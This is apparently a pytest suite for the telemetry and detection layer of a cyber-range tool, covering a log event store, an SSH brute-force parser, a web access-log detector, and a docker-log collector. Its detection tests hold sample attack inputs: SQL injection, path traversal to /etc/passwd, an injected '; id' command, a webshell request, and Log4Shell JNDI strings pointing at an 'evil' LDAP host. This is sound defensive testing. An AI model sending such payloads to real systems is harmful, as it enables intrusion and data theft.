"""Tests for the P1 telemetry layer: store, parsers, ground truth.

No docker required — the collector is exercised only against a bogus
container to verify graceful degradation.
"""

from __future__ import annotations

import asyncio

import pytest

from cyberorion.telemetry.store import TelemetryStore
from cyberorion.telemetry.collectors import (
    AuthLogParser,
    TelemetryCollector,
    looks_like_access_log,
    parse_docker_log_line,
    parse_net_listen,
    parse_ps_aux,
    parse_web_access_line,
)
from cyberorion.eval.ground_truth import (
    GroundTruth,
    get_ground_truth,
    set_ground_truth,
)
from cyberorion.scenarios.loader import Scenario, Target, Network


@pytest.fixture()
def store(tmp_path):
    s = TelemetryStore(tmp_path / "telemetry.db", session_id="session_test")
    yield s
    s.close()


# ---------------------------------------------------------------------------
# TelemetryStore CRUD + queries
# ---------------------------------------------------------------------------

class TestStore:
    def test_insert_and_query_events(self, store):
        store.insert_event(host="dvwa", source="web_access", technique="T1190",
                           severity="high", summary="SQLi attempt", raw="raw1",
                           ts=1000.0)
        store.insert_event(host="weak_ssh", source="auth", technique="T1110",
                           severity="medium", summary="failed login", raw="raw2",
                           ts=2000.0)
        store.insert_event(host="dvwa", source="web_access", technique="",
                           severity="info", summary="HTTP 404", raw="raw3",
                           ts=3000.0)

        assert len(store.query_events()) == 3
        assert len(store.query_events(host="dvwa")) == 2
        assert len(store.query_events(technique="T1190")) == 1
        assert len(store.query_events(severity="info")) == 1
        assert len(store.query_events(since=1500.0)) == 2
        assert len(store.query_events(text="failed")) == 1
        assert len(store.query_events(source="auth")) == 1
        assert len(store.query_events(limit=1)) == 1
        # Newest first.
        assert store.query_events()[0]["summary"] == "HTTP 404"

    def test_alerts(self, store):
        store.insert_alert(host="dvwa", technique="T1190", verdict="sqli",
                           confidence=0.9, evidence="ev", source_tool="check_web_log")
        store.insert_alert(host="weak_ssh", technique="T1110", verdict="brute",
                           confidence=0.7, evidence="ev2", status="closed")
        assert len(store.query_alerts()) == 2
        assert len(store.query_alerts(status="open")) == 1
        assert len(store.query_alerts(host="weak_ssh")) == 1
        row = store.query_alerts(status="open")[0]
        assert row["verdict"] == "sqli"
        assert row["confidence"] == pytest.approx(0.9)
        assert row["source_tool"] == "check_web_log"

    def test_attacks(self, store):
        store.insert_attack(target="dvwa", technique="T1190", action="attack_sqli",
                            success=True, evidence="SQLI: SUCCESS")
        store.insert_attack(target="weak_ssh", technique="T1110", action="attack_ssh",
                            success=False, evidence="SSH LOGIN: FAILED")
        assert len(store.query_attacks()) == 2
        assert len(store.query_attacks(success=True)) == 1
        assert len(store.query_attacks(target="weak_ssh")) == 1
        row = store.query_attacks(success=False)[0]
        assert row["success"] == 0
        assert row["technique"] == "T1110"

    def test_snapshots(self, store):
        assert store.latest_snapshot("dvwa", "process") is None
        store.insert_snapshot("dvwa", "process", [{"pid": 1, "user": "root", "cmd": "init"}])
        store.insert_snapshot("dvwa", "process", [{"pid": 2, "user": "www", "cmd": "apache"}])
        store.insert_snapshot("dvwa", "net", [{"proto": "tcp", "addr": "0.0.0.0",
                                               "port": 80, "proc": "apache2"}])
        latest = store.latest_snapshot("dvwa", "process")
        assert latest == [{"pid": 2, "user": "www", "cmd": "apache"}]
        net = store.latest_snapshot("dvwa", "net")
        assert net[0]["port"] == 80

    def test_counts(self, store):
        store.insert_event(host="h", source="s", severity="high")
        store.insert_event(host="h", source="s", severity="info")
        store.insert_alert(host="h")
        store.insert_attack(target="t", success=True)
        store.insert_snapshot("h", "process", [])
        c = store.counts()
        assert c["events"] == 2
        assert c["alerts"] == 1
        assert c["attacks"] == 1
        assert c["attacks_success"] == 1
        assert c["snapshots"] == 1
        assert c["events_by_severity"] == {"high": 1, "info": 1}

    def test_session_id_default(self, store):
        store.insert_event(host="h", source="s")
        assert store.query_events()[0]["session_id"] == "session_test"


# ---------------------------------------------------------------------------
# auth.log parser
# ---------------------------------------------------------------------------

class TestAuthLogParser:
    def test_failed_password(self):
        p = AuthLogParser(host="weak_ssh", source="auth")
        ev = p.feed("Jul 25 10:00:01 sshd[12]: Failed password for admin "
                    "from 172.29.0.1 port 51000 ssh2", ts=1000.0)
        assert ev is not None
        assert ev["technique"] == "T1110"
        assert ev["severity"] == "medium"
        assert "admin" in ev["summary"]
        assert "172.29.0.1" in ev["summary"]
        assert ev["host"] == "weak_ssh"

    def test_accepted_password(self):
        p = AuthLogParser(host="weak_ssh", source="auth")
        ev = p.feed("Jul 25 10:00:02 sshd[12]: Accepted password for ctf "
                    "from 172.29.0.1 port 51001 ssh2", ts=1000.0)
        assert ev is not None
        assert ev["technique"] == "T1078"
        assert ev["severity"] == "medium"
        assert "ctf" in ev["summary"]

    def test_invalid_user(self):
        p = AuthLogParser(host="weak_ssh", source="auth")
        ev = p.feed("Jul 25 10:00:03 sshd[12]: Invalid user bob "
                    "from 172.29.0.1 port 51002", ts=1000.0)
        assert ev is not None
        assert ev["technique"] == "T1110"
        assert "bob" in ev["summary"]

    def test_brute_force_aggregation(self):
        p = AuthLogParser(host="weak_ssh", source="auth")
        line = ("Jul 25 10:00:0{} sshd[12]: Failed password for root "
                "from 172.29.0.1 port 5100{} ssh2")
        e1 = p.feed(line.format(1, 1), ts=1000.0)
        e2 = p.feed(line.format(2, 2), ts=1010.0)
        e3 = p.feed(line.format(3, 3), ts=1020.0)
        assert e1["severity"] == "medium"
        assert e2["severity"] == "medium"
        # Third failure from the same IP within 60s -> high + aggregated.
        assert e3["severity"] == "high"
        assert "3" in e3["summary"]
        assert "172.29.0.1" in e3["summary"]

    def test_brute_force_suppresses_repeated_window_events(self):
        p = AuthLogParser(host="weak_ssh", source="auth")
        line = ("Jul 25 10:00:0{} sshd[12]: Invalid user user{} "
                "from 172.29.0.1 port 5100{}")
        assert p.feed(line.format(1, 1, 1), ts=1000.0) is not None
        assert p.feed(line.format(2, 2, 2), ts=1010.0) is not None
        high = p.feed(line.format(3, 3, 3), ts=1020.0)
        assert high is not None
        assert high["severity"] == "high"
        assert p.feed(line.format(4, 4, 4), ts=1030.0) is None
        assert p.feed(line.format(5, 5, 5), ts=1040.0) is None

    def test_brute_force_window_expires(self):
        p = AuthLogParser(host="weak_ssh", source="auth")
        line = ("Jul 25 10:00:00 sshd[12]: Failed password for root "
                "from 172.29.0.1 port 51000 ssh2")
        p.feed(line, ts=1000.0)
        p.feed(line, ts=1010.0)
        ev = p.feed(line, ts=2000.0)  # >60s later: window expired
        assert ev["severity"] == "medium"

    def test_distinct_ips_tracked_separately(self):
        p = AuthLogParser(host="weak_ssh", source="auth")
        for ip in ("10.0.0.1", "10.0.0.2"):
            ev = p.feed(f"Failed password for root from {ip} port 22 ssh2",
                        ts=1000.0)
            assert ev["severity"] == "medium"

    def test_irrelevant_lines_skipped(self):
        p = AuthLogParser(host="weak_ssh", source="auth")
        assert p.feed("", ts=1.0) is None
        assert p.feed("Jul 25 sshd[1]: Server listening on 0.0.0.0 port 22.",
                      ts=1.0) is None


# ---------------------------------------------------------------------------
# web access log parser
# ---------------------------------------------------------------------------

def _access(url: str, status: int = 200, method: str = "GET",
            ip: str = "172.29.0.1") -> str:
    return (f'{ip} - - [25/Jul/2026:10:00:00 +0000] '
            f'"{method} {url} HTTP/1.1" {status} 1234 "-" "curl/8.0"')


class TestWebAccessParser:
    def test_sqli_union(self):
        ev = parse_web_access_line(
            _access("/vulnerabilities/sqli/?id=1+UNION+SELECT+user,password+FROM+users"),
            host="dvwa", source="web_access")
        assert ev is not None
        assert ev["technique"] == "T1190"
        assert ev["severity"] == "medium"
        assert "SQL" in ev["summary"]

    def test_sqli_tautology_and_sleep(self):
        ev = parse_web_access_line(
            _access("/vulnerabilities/sqli/?id=%27+OR+1%3D1--+"),
            host="dvwa", source="web_access")
        assert ev["technique"] == "T1190"
        ev2 = parse_web_access_line(
            _access("/vulnerabilities/sqli/?id=1;SELECT+sleep(5)"),
            host="dvwa", source="web_access")
        assert ev2 is not None  # matches sleep( or cmdi metachars

    def test_path_traversal(self):
        ev = parse_web_access_line(
            _access("/vulnerabilities/fi/?page=../../../../etc/passwd"),
            host="dvwa", source="web_access")
        assert ev is not None
        assert ev["technique"] == "T1190"
        assert ev["severity"] == "medium"

    def test_cmd_injection(self):
        ev = parse_web_access_line(
            _access("/vulnerabilities/exec/", status=200, method="POST"),
            host="dvwa", source="web_access")
        # plain POST to exec page without metachars is benign
        assert ev is None
        ev = parse_web_access_line(
            _access("/vulnerabilities/exec/?ip=127.0.0.1;+id"),
            host="dvwa", source="web_access")
        assert ev is not None
        assert ev["technique"] == "T1059"
        assert ev["severity"] == "high"

    def test_jndi(self):
        ev = parse_web_access_line(
            _access("/solr/admin/?q=%24%7Bjndi:ldap://127.0.0.1:1389/exp%7D"),
            host="log4j", source="web_access")
        assert ev is not None
        assert ev["technique"] == "T1190"
        assert ev["severity"] == "high"

    def test_webshell(self):
        ev = parse_web_access_line(
            _access("/hackable/uploads/shell.php?cmd=id"),
            host="dvwa", source="web_access")
        assert ev is not None
        assert ev["technique"] == "T1505.003"
        assert ev["severity"] == "high"

    def test_http_error_stored_as_info(self):
        ev = parse_web_access_line(
            _access("/nope.php", status=404),
            host="dvwa", source="web_access")
        assert ev is not None
        assert ev["severity"] == "info"
        assert "404" in ev["summary"]

    def test_benign_skipped(self):
        ev = parse_web_access_line(
            _access("/index.php"),
            host="dvwa", source="web_access")
        assert ev is None

    def test_unparsable_skipped(self):
        assert parse_web_access_line("garbage line", host="dvwa",
                                     source="web_access") is None
        assert parse_web_access_line("", host="dvwa",
                                     source="web_access") is None


# ---------------------------------------------------------------------------
# docker logs parser (stdout-logging services)
# ---------------------------------------------------------------------------

class TestDockerLogsParser:
    def test_looks_like_access_log(self):
        assert looks_like_access_log(_access("/"))
        # werkzeug style (VAmPI): no referer/agent fields
        assert looks_like_access_log(
            '172.29.0.1 - - [25/Jul/2026 10:00:00] "GET / HTTP/1.1" 404 -')
        assert not looks_like_access_log(" * Running on http://0.0.0.0:5000")
        assert not looks_like_access_log("")

    def test_access_line_uses_web_parser(self):
        ev = parse_docker_log_line(
            _access("/users/v1/admin", status=401),
            host="vampi", source="stdout")
        assert ev["severity"] == "info"  # HTTP error stored as info
        assert "401" in ev["summary"]
        ev = parse_docker_log_line(
            _access("/users/v1?name=%27+UNION+SELECT+password--"),
            host="vampi", source="stdout")
        assert ev["severity"] == "medium"
        assert ev["technique"] == "T1190"

    def test_benign_access_line_skipped(self):
        assert parse_docker_log_line(
            _access("/"), host="vampi", source="stdout") is None

    def test_non_access_line_generic(self):
        ev = parse_docker_log_line(
            " * Running on http://0.0.0.0:5000", host="vampi", source="stdout")
        assert ev["severity"] == "info"
        assert ev["technique"] == ""

    def test_jndi_always_high(self):
        ev = parse_docker_log_line(
            'param=${jndi:ldap://evil/x}', host="vampi", source="stdout")
        assert ev["severity"] == "high"
        assert ev["technique"] == "T1190"


# ---------------------------------------------------------------------------
# snapshot parsers
# ---------------------------------------------------------------------------

class TestSnapshotParsers:
    def test_parse_ps_aux(self):
        out = parse_ps_aux(
            "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
            "root           1  0.0  0.1  20000  3000 ?        Ss   10:00   0:01 /sbin/init\n"
            "www-data     123  0.1  0.5 100000 20000 ?        S    10:01   0:02 apache2 -DFOREGROUND\n"
        )
        assert out == [
            {"pid": 1, "user": "root", "cmd": "/sbin/init"},
            {"pid": 123, "user": "www-data", "cmd": "apache2 -DFOREGROUND"},
        ]

    def test_parse_ps_aux_busybox(self):
        """busybox（alpine 最小镜像）的 ps aux 只有 PID USER TIME COMMAND 四列。"""
        out = parse_ps_aux(
            "PID   USER     TIME  COMMAND\n"
            "    1 root      0:00 sshd: /usr/sbin/sshd -D [listener]\n"
            " 1514 root      0:00 tail -n +1 -F /var/log/sshd.log\n"
        )
        assert out == [
            {"pid": 1, "user": "root",
             "cmd": "sshd: /usr/sbin/sshd -D [listener]"},
            {"pid": 1514, "user": "root",
             "cmd": "tail -n +1 -F /var/log/sshd.log"},
        ]

    def test_parse_net_listen_ss(self):
        out = parse_net_listen(
            "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\n"
            'tcp   LISTEN 0      128          0.0.0.0:80        0.0.0.0:*     users:(("apache2",pid=123,fd=4))\n'
        )
        assert out[0]["proto"] == "tcp"
        assert out[0]["port"] == 80
        assert "apache2" in out[0]["proc"]

    def test_parse_net_listen_no_netid_column(self):
        # ss variants without a Netid column start lines with LISTEN.
        out = parse_net_listen(
            "State  Recv-Q Send-Q Local Address:Port  Peer Address:Port\n"
            "LISTEN 0      128    127.0.0.1:3306      0.0.0.0:*\n"
        )
        assert out[0]["proto"] == "tcp"
        assert out[0]["addr"] == "127.0.0.1"
        assert out[0]["port"] == 3306


# ---------------------------------------------------------------------------
# Ground truth
# ---------------------------------------------------------------------------

class TestGroundTruth:
    def test_record_and_summary(self, store):
        gt = GroundTruth(store, "session_test")
        gt.record(target="dvwa", technique="T1190", action="attack_sqli",
                  success=True, evidence="SQLI: SUCCESS - data")
        gt.record(target="weak_ssh", technique="T1110", action="attack_ssh",
                  success=False, evidence="SSH LOGIN: FAILED")
        gt.record(target="dvwa", technique="T1505.003", action="upload_webshell",
                  success=True, evidence="WEBSHELL: UPLOADED")

        rows = store.query_attacks()
        assert len(rows) == 3
        assert all(r["session_id"] == "session_test" for r in rows)

        s = gt.summary()
        assert s["total"] == 3
        assert s["success"] == 2
        assert s["failed"] == 1
        assert s["by_technique"] == {"T1190": 1, "T1110": 1, "T1505.003": 1}
        assert s["by_target"] == {"dvwa": 2, "weak_ssh": 1}

    def test_session_binding(self, store):
        set_ground_truth(None)
        assert get_ground_truth() is None
        gt = GroundTruth(store, "session_test")
        set_ground_truth(gt)
        assert get_ground_truth() is gt
        set_ground_truth(None)
        assert get_ground_truth() is None


# ---------------------------------------------------------------------------
# Collector: graceful degradation without docker
# ---------------------------------------------------------------------------

def _fake_scenario() -> Scenario:
    target = Target(
        name="fake", container="co_nonexistent_container_xyz",
        ip="172.29.0.99", logs={"auth": "/var/log/sshd.log",
                                "web_access": "/var/log/apache2/access.log"},
    )
    return Scenario(name="fake", network=Network(subnet=""),
                    targets={"fake": target})


class TestCollector:
    def test_wait_ready_tracks_all_log_streams(self, store):
        """就绪屏障必须等待每条日志流完成基线定位。"""
        async def run():
            collector = TelemetryCollector(
                _fake_scenario(), store, "session_test")
            first, second = asyncio.Event(), asyncio.Event()
            collector._ready_events = [first, second]
            waiter = asyncio.create_task(collector.wait_ready(timeout=1.0))
            await asyncio.sleep(0)
            assert not waiter.done()
            first.set()
            await asyncio.sleep(0)
            assert not waiter.done()
            second.set()
            assert await waiter is True

        asyncio.run(run())

    def test_start_stop_without_docker(self, store):
        """Collector against a nonexistent container must not raise."""
        async def run():
            collector = TelemetryCollector(_fake_scenario(), store, "session_test")
            collector.start()
            assert len(collector._tasks) == 3  # 2 log tails + 1 snapshot loop
            await asyncio.sleep(0.3)
            await collector.stop()
            assert collector._tasks == []

        asyncio.run(run())

    def test_handle_line_routing(self, store):
        """_handle_line stores events and never publishes below medium."""
        async def run():
            collector = TelemetryCollector(_fake_scenario(), store, "session_test")
            auth = AuthLogParser(host="fake", source="auth")
            n = await collector._handle_line(
                "auth", auth, "fake", "auth",
                "Failed password for root from 1.2.3.4 port 22 ssh2", 0)
            assert n == 0
            n = await collector._handle_line(
                "web", None, "fake", "web_access",
                _access("/index.php"), 0)  # benign: skipped, no generic fallback
            assert n == 0
            n = await collector._handle_line(
                "generic", None, "fake", "solr",
                "INFO solr core loaded", 0)
            assert n == 1  # generic fallback counted
            events = store.query_events()
            assert len(events) == 2
            assert {e["source"] for e in events} == {"auth", "solr"}

        asyncio.run(run())

    def test_docker_logs_task_spawned(self, store):
        """A `docker_logs` log entry spawns a docker-logs tail, not a file tail."""
        target = Target(
            name="api", container="co_nonexistent_container_xyz",
            ip="172.29.0.98", logs={"stdout": "docker_logs"},
        )
        scenario = Scenario(name="fake", network=Network(subnet=""),
                            targets={"api": target})

        async def run():
            collector = TelemetryCollector(scenario, store, "session_test")
            collector.start()
            names = sorted(t.get_name() for t in collector._tasks)
            assert names == ["dockerlogs:api:stdout", "snap:api"]
            await asyncio.sleep(0.3)
            await collector.stop()
            assert collector._tasks == []

        asyncio.run(run())

    def test_handle_line_docker_logs_routing(self, store):
        """docker_logs lines: web parser for access lines, generic otherwise."""
        async def run():
            collector = TelemetryCollector(_fake_scenario(), store, "session_test")
            n = await collector._handle_line(
                "docker_logs", None, "vampi", "stdout",
                _access("/users/v1/nope", status=404), 0)
            assert n == 0  # access-log line: web parser, no generic count
            n = await collector._handle_line(
                "docker_logs", None, "vampi", "stdout",
                _access("/"), 0)  # benign access line: skipped
            assert n == 0
            n = await collector._handle_line(
                "docker_logs", None, "vampi", "stdout",
                " * Running on http://0.0.0.0:5000", 0)
            assert n == 1  # generic fallback counted
            n = await collector._handle_line(
                "docker_logs", None, "vampi", "stdout",
                "q=${jndi:ldap://evil/x}", 1)
            assert n == 1  # JNDI bypasses the generic cap
            events = store.query_events()
            assert len(events) == 3
            by_sev = {(e["severity"], e["technique"]) for e in events}
            assert ("info", "") in by_sev
            assert ("high", "T1190") in by_sev

        asyncio.run(run())
